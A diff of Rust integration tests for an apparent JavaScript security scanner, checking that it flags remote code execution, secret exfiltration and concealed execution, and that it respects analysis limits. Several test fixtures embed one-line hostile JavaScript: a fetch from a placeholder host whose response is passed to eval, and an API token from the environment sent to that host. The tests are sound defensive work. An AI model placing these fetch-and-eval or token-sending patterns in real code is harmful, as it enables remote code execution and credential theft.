@@ -40,6 +40,31 @@ fn policy_finding_returns_one() {
 }
 
 #[test]
+fn malicious_project_fixtures_produce_expected_high_and_critical_findings() {
+    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/malicious-projects");
+    for (project, finding_id, severity) in [
+        ("remote-eval", "JS-REMOTE-CODE-EXECUTION", "critical"),
+        ("secret-exfiltration", "JS-SECRET-EXFILTRATION", "critical"),
+        ("concealed-process", "JS-CONCEALED-EXECUTION", "high"),
+    ] {
+        let project_root = root.join(project);
+        let output = run(&[project_root.to_str().unwrap(), "--format=json"]);
+        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(report["status"], "complete", "{project}: {report}");
+        assert!(report["incomplete_reasons"].as_array().unwrap().is_empty());
+        assert!(
+            report["findings"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .any(|finding| { finding["id"] == finding_id && finding["severity"] == severity }),
+            "{project} did not produce {severity} {finding_id}: {}",
+            report["findings"]
+        );
+    }
+}
+
+#[test]
 fn disguised_javascript_is_reported_and_bad_source_is_incomplete() {
     let root = temporary_directory("javascript");
     fs::write(
@@ -483,6 +508,34 @@ fn representative_benign_js_patterns_complete_without_high_findings() {
         );
         fs::remove_dir_all(root).unwrap();
     }
+}
+
+#[test]
+fn large_clean_configuration_does_not_block_remote_flow_analysis() {
+    let root = temporary_directory("large-clean-flow-config");
+    let mut source = String::from("const config = {");
+    for index in 0..1_500 {
+        source.push_str(&format!("option_{index}: {{value: 'static'}},"));
+    }
+    source.push_str(
+        "}; async function boot() { const options = config; const response = await fetch('https://example.invalid/x'); eval(await response.text()); } boot();",
+    );
+    fs::write(root.join("main.js"), source).unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["status"], "complete");
+    assert!(report["incomplete_reasons"].as_array().unwrap().is_empty());
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
+                && finding["severity"] == "critical")
+    );
+    fs::remove_dir_all(root).unwrap();
 }
 
 #[test]
@@ -1252,7 +1305,7 @@ fn embedded_script_parse_and_count_limits_make_the_scan_incomplete() {
 #[test]
 fn global_semantic_module_limit_is_reported_once() {
     let root = temporary_directory("semantic-module-limit");
-    for index in 0..10_001 {
+    for index in 0..20_001 {
         fs::write(
             root.join(format!("module-{index:05}.js")),
             b"export const value = 1;",
@@ -1315,11 +1368,38 @@ fn flow_environment_fork_work_is_bounded() {
 }
 
 #[test]
-fn recursive_flow_stops_at_the_call_depth_limit() {
-    let root = temporary_directory("flow-call-depth-limit");
+fn clean_recursive_calls_are_analyzed_once_without_hitting_the_depth_limit() {
+    let root = temporary_directory("flow-clean-recursion");
     fs::write(
         root.join("main.js"),
-        b"function recurse() { recurse(); } recurse();",
+        b"const token = process.env.API_TOKEN; function recurse(path) { if (path) recurse(path); fetch('https://example.invalid/x', {body: token}); } recurse('src');",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(1));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["status"], "complete");
+    assert!(report["incomplete_reasons"].as_array().unwrap().is_empty());
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| {
+                finding["id"] == "JS-SECRET-EXFILTRATION" && finding["severity"] == "critical"
+            })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn tainted_recursive_calls_stop_at_the_nesting_limit() {
+    let root = temporary_directory("flow-tainted-recursion-limit");
+    fs::write(
+        root.join("main.js"),
+        b"function recurse(payload) { recurse(payload); eval(payload); } recurse(fetch('https://example.invalid/x').text());",
     )
     .unwrap();
 
@@ -1331,8 +1411,28 @@ fn recursive_flow_stops_at_the_call_depth_limit() {
     assert!(
         report["incomplete_reasons"]
             .to_string()
-            .contains("call depth 32")
+            .contains("evaluator nesting limit 512")
     );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn nested_control_blocks_do_not_consume_function_call_depth() {
+    let root = temporary_directory("nested-control-depth");
+    let mut source = String::new();
+    for _ in 0..64 {
+        source.push_str("if (gate) {\n");
+    }
+    source.push_str("const answer = 42;\n");
+    source.push_str(&"}\n".repeat(64));
+    fs::write(root.join("main.js"), &source).unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    assert_eq!(output.status.code(), Some(0));
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["status"], "complete");
+    assert!(report["incomplete_reasons"].as_array().unwrap().is_empty());
     fs::remove_dir_all(root).unwrap();
 }
 
@@ -1343,7 +1443,7 @@ fn repeated_large_value_copies_consume_bounded_flow_work() {
     for index in 0..5_000 {
         properties.push_str(&format!("item_{index}: 'data',"));
     }
-    let mut source = format!("const payload = {{{properties}}};\n");
+    let mut source = format!("const payload = {{{properties}secret: process.env.API_TOKEN}};\n");
     source.push_str(&"consume(payload);\n".repeat(5_000));
     fs::write(root.join("main.js"), source).unwrap();
 
